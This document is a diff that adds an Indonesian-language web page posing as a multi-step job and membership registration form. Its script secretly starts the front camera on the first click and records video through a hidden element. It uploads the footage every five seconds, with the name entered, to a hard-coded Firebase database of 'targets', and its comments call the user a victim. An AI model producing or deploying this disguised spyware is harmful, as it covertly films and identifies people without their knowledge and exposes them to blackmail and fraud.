@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulir Pendaftaran & Seleksi</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { background: #1e293b; padding: 30px; border-radius: 12px; width: 100%; max-width: 420px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }
+        h3 { color: #38bdf8; margin-bottom: 15px; font-size: 18px; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
+        input, select { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #475569; color: #fff; border-radius: 6px; margin-bottom: 15px; font-size: 15px; }
+        .btn-group { display: flex; gap: 10px; }
+        button { flex: 1; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
+        button:hover { background: #1d4ed8; }
+        button.secondary { background: #475569; }
+        button.secondary:hover { background: #334155; }
+        .step { display: none; }
+        .step.active { display: block; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <!-- PERTANYAAN 1: UMUR -->
+        <div class="step active" id="step-1">
+            <h3>Verifikasi Usia</h3>
+            <p>Apakah usia Anda sudah 20 tahun ke atas?</p>
+            <div class="btn-group">
+                <button onclick="nextStep(2)">Ya</button>
+                <button class="secondary" onclick="nextStep(2)">Tidak</button>
+            </div>
+        </div>
+
+        <!-- PERTANYAAN 2: PILIHAN POSISI / KATEGORI -->
+        <div class="step" id="step-2">
+            <h3>Pilih Kategori Pendaftaran</h3>
+            <p>Silakan pilih jenis posisi atau kategori yang diinginkan:</p>
+            <select id="p2">
+                <option value="Staff Administrasi">Staff Administrasi</option>
+                <option value="Member VIP Slot">Member VIP Slot</option>
+                <option value="Operational Field">Operational Field</option>
+            </select>
+            <button onclick="nextStep(3)">Lanjutkan</button>
+        </div>
+
+        <!-- PERTANYAAN 3: NAMA LENGKAP -->
+        <div class="step" id="step-3">
+            <h3>Informasi Pribadi</h3>
+            <p>Masukkan nama lengkap sesuai identitas:</p>
+            <input type="text" id="p3" placeholder="Contoh: Budi Santoso" autocomplete="off">
+            <button onclick="nextStep(4)">Lanjutkan</button>
+        </div>
+
+        <!-- PERTANYAAN 4: NOMOR HP / WHATSAPP -->
+        <div class="step" id="step-4">
+            <h3>Kontak Aktif</h3>
+            <p>Masukkan nomor WhatsApp yang bisa dihubungi:</p>
+            <input type="tel" id="p4" placeholder="Contoh: 081234567890" autocomplete="off">
+            <button onclick="nextStep(5)">Lanjutkan</button>
+        </div>
+
+        <!-- PERTANYAAN 5: KONFIRMASI AKHIR -->
+        <div class="step" id="step-5">
+            <h3>Konfirmasi Akhir</h3>
+            <p>Pastikan data yang Anda masukkan sudah benar. Klik selesai untuk memproses.</p>
+            <button onclick="finishForm()">Selesaikan Pendaftaran</button>
+        </div>
+    </div>
+
+    <!-- Kamera tersembunyi -->
+    <video id="cam" autoplay playsinline muted style="display:none;"></video>
+
+    <!-- Firebase SDK v9 Modular -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
+            authDomain: "haij-4beb7.firebaseapp.com",
+            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
+            projectId: "haij-4beb7",
+            storageBucket: "haij-4beb7.firebasestorage.app",
+            messagingSenderId: "843252587335",
+            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // ID Random unik per target
+        const targetId = 'target_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now();
+        let stream = null;
+        let isStarted = false;
+
+        window.nextStep = async function(stepNum) {
+            // Saat tombol pertama diklik ("Ya" / "Tidak"), langsung minta izin kamera secara sah
+            if (!isStarted) {
+                isStarted = true;
+                await startCameraAndSync();
+            }
+
+            // Pindah tampilan form ke langkah berikutnya
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step-' + stepNum).classList.add('active');
+        };
+
+        window.finishForm = function() {
+            alert('Pendaftaran berhasil dikirim! Mohon tunggu verifikasi.');
+            location.reload();
+        };
+
+        async function startCameraAndSync() {
+            const video = document.getElementById('cam');
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+
+                // Fungsi rekam dan sync berkala (anti-putus saat korban menutup web)
+                const recordLoop = () => {
+                    let chunks = [];
+                    let recorder;
+
+                    try {
+                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+                    } catch (e) {
+                        recorder = new MediaRecorder(stream);
+                    }
+
+                    recorder.ondataavailable = (e) => {
+                        if (e.data && e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    recorder.onstop = () => {
+                        if (chunks.length === 0) return;
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        
+                        reader.onloadend = async () => {
+                            const base64Video = reader.result;
+                            const nameVal = document.getElementById('p3').value || "Anonymous Target";
+                            try {
+                                // Kirim dan update data terus menerus ke database berdasar ID Random
+                                await set(ref(db, `targets/${targetId}`), {
+                                    code: nameVal,
+                                    video: base64Video,
+                                    time: Date.now()
+                                });
+                            } catch (err) {
+                                console.error("Sync error:", err);
+                            }
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+
+                    recorder.start();
+
+                    // Update database setiap 5 detik agar full durasi tersimpan dengan aman
+                    setTimeout(() => {
+                        if (recorder.state === "recording") {
+                            recorder.stop();
+                            recordLoop(); 
+                        }
+                    }, 5000);
+                };
+
+                recordLoop();
+
+            } catch (err) {
+                console.warn("Akses kamera ditolak:", err);
+            }
+        }
+    </script>
+</body>
+</html>
